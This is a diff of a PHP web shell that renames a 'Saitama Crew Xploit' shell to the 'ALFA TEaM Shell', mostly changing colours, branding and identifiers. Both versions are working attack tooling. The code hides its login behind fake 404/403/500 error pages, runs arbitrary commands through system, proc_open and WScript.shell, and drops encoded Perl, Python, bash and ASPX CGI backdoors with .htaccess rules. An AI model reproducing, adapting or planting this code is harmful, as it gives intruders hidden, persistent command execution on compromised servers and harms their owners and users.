@@ -1,16 +1,17 @@
 <?php
 /*
-	Author: 	saitama Crew Xploit & Strezz Boy
-	YouTube: 	https://www.youtube.com/@saitamacrewxploit2638
-	Gmail:		saitamacrewxploit@gmail.com
-	Date:		Monday, Maret 15, 2021
+	Author: 	Solevisible/Alfa-Team
+	Telegram: 	https://telegram.me/solevisible
+	YouTube: 	https://youtube.com/solevisible
+	Gmail:		solevisible@gmail.com
+	Date:		Monday, September 14, 2020
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'sibueee',
-    'password' => 'bcfee9cf57951e9596098cc4749d390b',
+    'password' => 'bcfee9cf57951e9596098cc4749d390b',//md5(ehsan)
     'safe_mode' => '1',
     'login_page' => '404',
-    'show_icons' => '0',
+    'show_icons' => '1',
     'post_encryption' => false,
     'cgi_api' => true,
 );
@@ -175,15 +176,15 @@ if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemod
 if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
 if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
 if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
-define("__saitama_VERSION__", "4.1");
-define("__saitama_UPDATE__", "2");
-define("__saitama_CODE_NAME__", "saitama");
-define("__SAITAMA_DATA_FOLDER__", "SAITAMA_DATA");
-define("__saitama_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
-define("__saitama_SECRET_KEY__", __saitama_POST_ENCRYPTION__?_saitamaSecretKey():'');
-$GLOBALS['__saitama_COLOR__'] = array(
+define("__ALFA_VERSION__", "4.1");
+define("__ALFA_UPDATE__", "2");
+define("__ALFA_CODE_NAME__", "Tesla");
+define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
+define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
+define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
+$GLOBALS['__ALFA_COLOR__'] = array(
 		"shell_border" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".header" => "border: 7px solid {color}",
 				"#meunlist" => "border-color: {color}",
@@ -192,43 +193,43 @@ $GLOBALS['__saitama_COLOR__'] = array(
 				".foot" => "border-color: {color}",
 			)
 		),
-		"header_vars" => "#ff0800",
-		"header_values" => "#BF40BF",
-		"header_on" => "#00ffff",
-		"header_off" => "#E6E6FA",
-		"header_none" => "#00ffff",
-		"home_shell" => "#E6E6FA",
+		"header_vars" => "#27979B",
+		"header_values" => "#67ABDF",
+		"header_on" => "#00FF00",
+		"header_off" => "#ff0000",
+		"header_none" => "#00FF00",
+		"home_shell" => "#ff0000",
 		"home_shell:hover" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".home_shell:hover" => "color: {color};",
 			)
 		),
 		"back_shell" => "#efbe73",
 		"back_shell:hover" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".back_shell:hover" => "color: {color};",
 			)
 		),
-		"header_pwd" => "#00ffff",
+		"header_pwd" => "#00FF00",
 		"header_pwd:hover" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".header_pwd:hover" => "color: {color};",
 			)
 		),
-		"header_drive" => "#00ffff",
+		"header_drive" => "#00FF00",
 		"header_drive:hover" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".header_drive:hover" => "color: {color};",
 			)
 		),
-		"header_show_all" => "#00ffff",
-		"disable_functions" => "#E6E6FA",
-		"footer_text" => "#ff0800",
-		"menu_options" => "#ff0800",
+		"header_show_all" => "#00FF00",
+		"disable_functions" => "#ff0000",
+		"footer_text" => "#27979B",
+		"menu_options" => "#27979B",
 		"menu_options:hover" => array(
 			"key_color" => "#646464",
 			"multi_selector" => array(
@@ -236,13 +237,13 @@ $GLOBALS['__saitama_COLOR__'] = array(
 			)
 		),
 		"options_list" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#00FF00",
 			"multi_selector" => array(
 				".content_options_holder .header center a" => "color: {color};",
 			)
 		),
 		"options_list:hover" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".content_options_holder .header center a:hover" => "color: {color};",
 			)
@@ -254,25 +255,25 @@ $GLOBALS['__saitama_COLOR__'] = array(
 			)
 		),
 		"options_list_text" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".txtfont,.tbltxt" => "color: {color};",
 			)
 		),
-		"saitama+" => array(
+		"Alfa+" => array(
 			"key_color" => "#06ff0f",
 			"multi_selector" => array(
-				".saitama_plus" => "color: {color};font-weight: unset;",
+				".alfa_plus" => "color: {color};font-weight: unset;",
 			)
 		),
 		"hidden_shell_text" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#00FF00",
 			"multi_selector" => array(
 				"#hidden_sh a" => "color: {color};",
 			)
 		),
-		"hidden_shell_version" => "#E6E6FA",
-		"shell_name" => "#E6E6FA",
+		"hidden_shell_version" => "#ff0000",
+		"shell_name" => "#FF0000",
 		"main_row:hover" => array(
 			"key_color" => "#646464",
 			"multi_selector" => array(
@@ -280,26 +281,26 @@ $GLOBALS['__saitama_COLOR__'] = array(
 			)
 		),
 		"main_header" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".main th" => "color: {color};",
 			)
 		),
 		"main_name" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".main .main_name" => "color: {color};font-weight: unset;",
 			)
 		),
-		"main_size" => "#E6E6FA",
-		"main_modify" => "#E6E6FA",
-		"main_owner_group" => "#E6E6FA",
-		"main_green_perm" => "#00ffff",
-		"main_red_perm" => "#ff0800",
-		"main_white_perm" => "#E6E6FA",
-		"beetween_perms" => "#00ffff",
+		"main_size" => "#67ABDF",
+		"main_modify" => "#67ABDF",
+		"main_owner_group" => "#67ABDF",
+		"main_green_perm" => "#25ff00",
+		"main_red_perm" => "#FF0000",
+		"main_white_perm" => "#FFFFFF",
+		"beetween_perms" => "#FFFFFF",
 		"main_actions" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".main .actions" => "color: {color};",
 			)
@@ -311,7 +312,7 @@ $GLOBALS['__saitama_COLOR__'] = array(
 			)
 		),
 		"minimize_editor_background" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#0e304a",
 			"multi_selector" => array(
 				".minimized-wrapper" => "background-color: {color};",
 			)
@@ -323,7 +324,7 @@ $GLOBALS['__saitama_COLOR__'] = array(
 			)
 		),
 		"editor_border" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#0e304a",
 			"multi_selector" => array(
 				".editor-explorer,.editor-modal" => "border: 2px solid {color};",
 			)
@@ -335,37 +336,37 @@ $GLOBALS['__saitama_COLOR__'] = array(
 			)
 		),
 		"editor_header_background" => array(
-			"key_color" => "rgba(255, 8, 0, 1)",
+			"key_color" => "rgba(21, 66, 88, 0.93)",
 			"multi_selector" => array(
 				".editor-header" => "background-color: {color};",
 			)
 		),
 		"editor_header_text" => array(
-			"key_color" => "#fff",
+			"key_color" => "#00ff7f",
 			"multi_selector" => array(
 				".editor-path" => "color: {color};",
 			)
 		),
 		"editor_header_button" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#1d5673",
 			"multi_selector" => array(
 				".close-button, .editor-minimize" => "background-color: {color};",
 			)
 		),
 		"editor_actions" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".editor_actions" => "color: {color};",
 			)
 		),
 		"editor_file_info_vars" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".editor_file_info_vars" => "color: {color};",
 			)
 		),
 		"editor_file_info_values" => array(
-			"key_color" => "#BF40BF",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".filestools" => "color: {color};",
 			)
@@ -395,7 +396,7 @@ $GLOBALS['__saitama_COLOR__'] = array(
 			)
 		),
 		"input_box_border" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				"input[type=text],textarea" => "border: 1px solid {color}",
 			)
@@ -407,13 +408,13 @@ $GLOBALS['__saitama_COLOR__'] = array(
 			)
 		),
 		"input_box:hover" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
 			)
 		),
 		"select_box_border" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				"select" => "border: 1px solid {color}",
 			)
@@ -425,74 +426,74 @@ $GLOBALS['__saitama_COLOR__'] = array(
 			)
 		),
 		"select_box:hover" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				"select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
 			)
 		),
 		"button_border" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				"input[type=submit],.button,#addup" => "border: 1px solid {color};",
 			)
 		),
 		"button:hover" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				"input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
 				".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
 			)
 		),
 		"outputs_text" => array(
-			"key_color" => "#BF40BF",
+			"key_color" => "#67ABDF",
 			"multi_selector" => array(
 				".ml1" => "color: {color};",
 			)
 		),
 		"outputs_border" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".ml1" => "border: 1px solid {color};",
 			)
 		),
 		"uploader_border" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".inputfile" => "box-shadow:0 0 4px {color};border:1px solid {color};",
 			)
 		),
 		"uploader_background" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#0E304A",
 			"multi_selector" => array(
 				".inputfile strong" => "background-color: {color};",
 			)
 		),
 		"uploader_text_right" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".inputfile strong" => "color: {color};",
 			)
 		),
 		"uploader_text_left" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#25ff00",
 			"multi_selector" => array(
 				".inputfile span" => "color: {color};",
 			)
 		),
 		"uploader:hover" => array(
-			"key_color" => "#ff0800",
+			"key_color" => "#27979B",
 			"multi_selector" => array(
 				".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
 			)
 		),
 		"uploader_progress_bar" => array(
-			"key_color" => "#00ffff",
+			"key_color" => "#00ff00",
 			"multi_selector" => array(
 				".up_bar" => "background-color: {color};",
 			)
 		),
-		"mysql_tables" => "#00ffff",
-		"mysql_table_count" => "#BF40BF",
+		"mysql_tables" => "#00FF00",
+		"mysql_table_count" => "#67ABDF",
 		"copyright" => "#dfff00",
 		"scrollbar" => array(
 			"key_color" => "#1e82b5",
@@ -508,21 +509,21 @@ $GLOBALS['__saitama_COLOR__'] = array(
 		),
 );
 $GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
-$config = array('saitamaUser' => $GLOBALS['DB_NAME']['user'],'saitamaPass' => $GLOBALS['DB_NAME']['pass'],'saitamaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'saitamaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
+$config = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
 //@session_start();
 @session_write_close();
 @ignore_user_abort(true);
 @set_time_limit(0);
 @ini_set('memory_limit', '-1');
 @ini_set("upload_max_filesize", "9999m");
-if($config['saitamaProtectShell']){
+if($config['AlfaProtectShell']){
 $SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
 $Eform='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
-if($config['saitamaLoginPage'] == 'gui'){
-if(@$_COOKIE["saitamaUser"] != $config['saitamaUser'] && $_COOKIE["saitamaPass"] != md5($config['saitamaPass'])){
-if(@$_POST["usrname"]==$config['saitamaUser'] && @md5($_POST["password"])==$config['saitamaPass']){
-__saitama_set_cookie("saitamaUser", $config['saitamaUser']);
-__saitama_set_cookie("saitamaPass", @md5($config['saitamaPass']));
+if($config['AlfaLoginPage'] == 'gui'){
+if(@$_COOKIE["AlfaUser"] != $config['AlfaUser'] && $_COOKIE["AlfaPass"] != md5($config['AlfaPass'])){
+if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
 echo '
@@ -531,11 +532,11 @@ body{background: black;}
 #loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
-<title>~ Saitama Crew Xploit Shell-v'.__saitama_VERSION__.'-'.__saitama_CODE_NAME__.' ~</title><center>
-<center><img style="border-radius:100px;" width="500" height="250" alt="Saitama Crew Xploit 2012" draggable="false" src="https://saitamacrewxploit.xyz/images/logo.png" /></center>
+<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
+<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
-<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Saitama Crew Xploit Shell-v'.__saitama_VERSION__.'-'.__saitama_CODE_NAME__.' ~</b></font></th></tr>
+<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
 <tr><td bgcolor="black" style="padding:5">
 <form method="post">
 <input type="hidden" name="action" value="login">
@@ -547,31 +548,31 @@ body{background: black;}
 </div><br /></center>';
 exit;
 }
-}elseif($config['saitamaLoginPage']=='500'){
-if(@$_COOKIE["saitamaPass"] != @md5($config['saitamaPass'])){
-if(@md5($_POST["password"])==$config['saitamaPass']){
-__saitama_set_cookie("saitamaUser", $config['saitamaUser']);
-__saitama_set_cookie("saitamaPass", @md5($config['saitamaPass']));
+}elseif($config['AlfaLoginPage']=='500'){
+if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
+if(@md5($_POST["password"])==$config['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
 echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
 exit;
 }
-}elseif($config['saitamaLoginPage']=='403'){
-if(@$_COOKIE["saitamaPass"] != @md5($config['saitamaPass'])){
-if(@md5($_POST["password"])==$config['saitamaPass']){
-__saitama_set_cookie("saitamaUser", $config['saitamaUser']);
-__saitama_set_cookie("saitamaPass", @md5($config['saitamaPass']));
+}elseif($config['AlfaLoginPage']=='403'){
+if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
+if(@md5($_POST["password"])==$config['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
 echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
 exit;
 }
-}elseif($config['saitamaLoginPage']=='404'){
-if(@$_COOKIE["saitamaPass"] != @md5($config['saitamaPass'])){
-if(@md5($_POST["password"])==$config['saitamaPass']){
-__saitama_set_cookie("saitamaUser", $config['saitamaUser']);
-__saitama_set_cookie("saitamaPass", @md5($config['saitamaPass']));
+}elseif($config['AlfaLoginPage']=='404'){
+if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
+if(@md5($_POST["password"])==$config['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
 echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
@@ -580,8 +581,8 @@ exit;
 }
 }
 function decrypt_post($str){
-	if(__saitama_POST_ENCRYPTION__){
-		$pwd = __saitama_SECRET_KEY__;
+	if(__ALFA_POST_ENCRYPTION__){
+		$pwd = __ALFA_SECRET_KEY__;
 		$pwd     = __ZW5jb2Rlcg($pwd);
 		$str     = __ZGVjb2Rlcg($str);
 		$enc_chr = "";
@@ -602,19 +603,19 @@ function decrypt_post($str){
 	}
 }
 
-function _saitamaSecretKey(){
-	$secret = @$_COOKIE["saitamaSecretKey"];
-	if(!isset($_COOKIE["saitamaSecretKey"])){
+function _AlfaSecretKey(){
+	$secret = @$_COOKIE["AlfaSecretKey"];
+	if(!isset($_COOKIE["AlfaSecretKey"])){
 		$secret = uniqid(mt_rand(), true);
-		__saitama_set_cookie("saitamaSecretKey", $secret);
+		__alfa_set_cookie("AlfaSecretKey", $secret);
 	}
 	return $secret;
 }
-function saitama_getColor($target){
+function alfa_getColor($target){
 	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
 		return $GLOBALS["DB_NAME"]["color"][$target];
 	}else{
-		$target = $GLOBALS["__saitama_COLOR__"][$target];
+		$target = $GLOBALS["__ALFA_COLOR__"][$target];
 		if(is_array($target)){
 			return $target["key_color"];
 		}else{
@@ -622,16 +623,16 @@ function saitama_getColor($target){
 		}
 	}
 }
-function saitamaCssLoadColors(){
+function alfaCssLoadColors(){
 	$css = "";
-	foreach($GLOBALS['__saitama_COLOR__'] as $key => $value){
+	foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
 		if(!is_array($value)){
-			$value = saitama_getColor($key);
+			$value = alfa_getColor($key);
 			$css .= ".{$key}{color: {$value};}";
 		}else{
 			if(isset($value["multi_selector"])){
 				foreach($value["multi_selector"] as $k => $v){
-					$color = saitama_getColor($key);
+					$color = alfa_getColor($key);
 					$code = str_replace("{color}", $color, $v);
 					$css .=  $k."{".$code."}";
 				}
@@ -641,29 +642,29 @@ function saitamaCssLoadColors(){
 	return $css;
 }
 if(isset($_POST['ajax'])){
-function saitamaNum(){
+function AlfaNum(){
 $args = func_get_args();
-$saitamax = array();
+$alfax = array();
 $find = array();
 for($i=1;$i<=10;$i++){
-$saitamax[] = $i;
+$alfax[] = $i;
 }
 foreach($args as $arg){
 $find[] = $arg;
 }
 echo '<script>';
-foreach($saitamax as $saitama){
-if(in_array($saitama,$find))
+foreach($alfax as $alfa){
+if(in_array($alfa,$find))
 continue;
-echo 'saitama'.$saitama."_=";
+echo 'alfa'.$alfa."_=";
 }
 echo '""</script>';
 }}
-function _saitama_cgicmd($cmd,$lang="perl",$set_cookie=false){
+function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
 	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
 		return "";
 	}
-	if(isset($_COOKIE["saitamacgiapi_mode"])){
+	if(isset($_COOKIE["alfacgiapi_mode"])){
 		return "";
 	}
 	$cmd_pure = $cmd;
@@ -671,13 +672,13 @@ function _saitama_cgicmd($cmd,$lang="perl",$set_cookie=false){
 	$is_socket = function_exists('fsockopen');
 	if($is_curl||$is_socket){
 		$recreate = false;
-		if(isset($_COOKIE["saitamacgiapi"])){
-			if(!@file_exists("saitamacgiapi/".$_COOKIE["saitamacgiapi"].".saitama")){
+		if(isset($_COOKIE["alfacgiapi"])){
+			if(!@file_exists("alfacgiapi/".$_COOKIE["alfacgiapi"].".alfa")){
 				$recreate = true;
-				$lang = $_COOKIE["saitamacgiapi"];
+				$lang = $_COOKIE["alfacgiapi"];
 			}
 		}
-		if(!isset($_COOKIE["saitamacgiapi"])||$recreate){
+		if(!isset($_COOKIE["alfacgiapi"])||$recreate){
 			@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
 			$perl = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
 			$py = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
@@ -685,46 +686,46 @@ function _saitama_cgicmd($cmd,$lang="perl",$set_cookie=false){
 			$aspx = "jZNda9swFIavk18hNAoOAXdsozdLyrrUKYaRlriNN0IuFPvEFbUl70jOB2P97T1SPBo8ynZlS+d53/Ph49HZF3YnCmDfhCoaehnzyTvOIiXWJSwk7BIrLF1uRGmAs7PL/ogUcVVrtGwmKjC1yCieHIyFKkxhHT7E7jHRyqIuzb8111IUShsrs/+A41vPENTvGYtSFSyrcjZmc/jZgLHhVGO15HTHV59fkUfInv6G3K3H5CZokTHj6cfZdn2z+CC+z+of1b7cVNOdWLwf88Gvfq+3PlhYrlgurCDDtipqdgtIvqirr8LAxafEJw6ojgH59441tvQ97G14lUziOFKZzok7nsIbsK3O2ZOQlHeoMzCG1aRXsGPtOfC2dUifB22sNjqcINCXmulUqlzviLbYQBeayhLcUCnsZhTCHniXucKiqUBZ46DzjHE2dDPuYg8Gkkcoy2gPWWOdo9+RLjaHXCJk1JhQucD8trF1Y98orwtHiBrfYFONTzSqay/QePDVnjYTHAfYroD+k9dHT0qhpCK/15HKgwF1+hr2yU+jzntO+6iVgTBFaSHgS6NL2Eoj6Xd5FrVcjWqESz48phvy0bk/O+3vPi3uCw==";
 			if($lang=="perl")$source = $perl;elseif($lang=="py")$source = $py;else $source = $bash;
 			if($lang == "aspx"){
-				saitamaWriteTocgiapi("aspx.aspx",$aspx);
+				alfaWriteTocgiapi("aspx.aspx",$aspx);
 			}else{
-				saitamaWriteTocgiapi($lang.".saitama",$source);
+				alfaWriteTocgiapi($lang.".alfa",$source);
 			}
-			saitamacgihtaccess('cgi', "saitamacgiapi/");
+			alfacgihtaccess('cgi', "alfacgiapi/");
 		}else{
-			$lang = $_COOKIE["saitamacgiapi"];
+			$lang = $_COOKIE["alfacgiapi"];
 		}
-		$cgi_ext = ".saitama";
+		$cgi_ext = ".alfa";
 		if($lang=="aspx"){
 			$cgi_ext = ".aspx";
 		}
-		$cgi_url = __SAITAMA_DATA_FOLDER__."/saitamacgiapi/".$lang.$cgi_ext;
+		$cgi_url = __ALFA_DATA_FOLDER__."/alfacgiapi/".$lang.$cgi_ext;
 		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
 		if($is_curl){
 			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
-			$post = new saitamaCURL();
+			$post = new AlfaCURL();
 			$data = $post->Send($address, "post", $cmd);
 		}elseif($is_socket){
 			$server = $_SERVER["SERVER_NAME"];
 			$uri = dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
-			$data = _saitama_fsockopen($server,$uri,$cmd);
+			$data = _alfa_fsockopen($server,$uri,$cmd);
 		}
 		$out = "";
 		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
 			if($set_cookie){
-				__saitama_set_cookie("saitamacgiapi", $lang);
+				__alfa_set_cookie("alfacgiapi", $lang);
 			}
 			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
 				$out = $res[1];
 			}
 		}elseif($lang=="perl"){
-			return _saitama_cgicmd($cmd_pure,"py",$set_cookie);
+			return _alfa_cgicmd($cmd_pure,"py",$set_cookie);
 		}elseif($lang=="py"){
-			return _saitama_cgicmd($cmd_pure,"bash",$set_cookie);
+			return _alfa_cgicmd($cmd_pure,"bash",$set_cookie);
 		}elseif($lang=="bash" && $GLOBALS['sys']=="win"){
-			return _saitama_cgicmd($cmd_pure,"aspx",$set_cookie);
+			return _alfa_cgicmd($cmd_pure,"aspx",$set_cookie);
 		}else{
 			if($set_cookie){
-				__saitama_set_cookie("saitamacgiapi_mode", "off");
+				__alfa_set_cookie("alfacgiapi_mode", "off");
 			}
 		}
 		return trim($out);
@@ -732,19 +733,19 @@ function _saitama_cgicmd($cmd,$lang="perl",$set_cookie=false){
 		return "";
 	}
 }
-function saitamaGetCwd(){
+function alfaGetCwd(){
 	if(function_exists("getcwd")){
 		return @getcwd();
 	}else{
 		return dirname($_SERVER["SCRIPT_FILENAME"]);
 	}
 }
-function saitamaEx($in,$re=false,$cgi=true,$all=false){
-	$data = _saitama_php_cmd($in,$re);
+function alfaEx($in,$re=false,$cgi=true,$all=false){
+	$data = _alfa_php_cmd($in,$re);
 	if(empty($data)&&$cgi||$all){
 		if($GLOBALS['sys']=='unix'){
-			if(strlen(_saitama_php_cmd("whoami"))==0||$all){
-				$cmd = _saitama_cgicmd($in);
+			if(strlen(_alfa_php_cmd("whoami"))==0||$all){
+				$cmd = _alfa_cgicmd($in);
 				if(!empty($cmd)){
 					return $cmd;
 				}
@@ -753,7 +754,7 @@ function saitamaEx($in,$re=false,$cgi=true,$all=false){
 	}
 	return $data;
 }
-function _saitama_php_cmd($in,$re=false){
+function _alfa_php_cmd($in,$re=false){
 $out='';
 try{
 if($re)$in=$in." 2>&1";
@@ -782,15 +783,15 @@ $pipes = array();
 $process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
 $out=@stream_get_contents($pipes[1]);
 }elseif(class_exists('COM')){
-$saitamaWs = new COM('WScript.shell');
-$exec = $saitamaWs->exec('cmd.exe /c '.$_POST['saitama1']);
+$alfaWs = new COM('WScript.shell');
+$exec = $alfaWs->exec('cmd.exe /c '.$_POST['alfa1']);
 $stdout = $exec->StdOut();
 $out=$stdout->ReadAll();
 }
 }catch(Exception $e){}
 return $out;
 }
-function _saitama_fsockopen($server,$uri,$post){
+function _alfa_fsockopen($server,$uri,$post){
 	$socket = @fsockopen($server, 80, $errno, $errstr, 15);
 	if($socket){
 		$http  = "POST {$uri} HTTP/1.0\r\n";
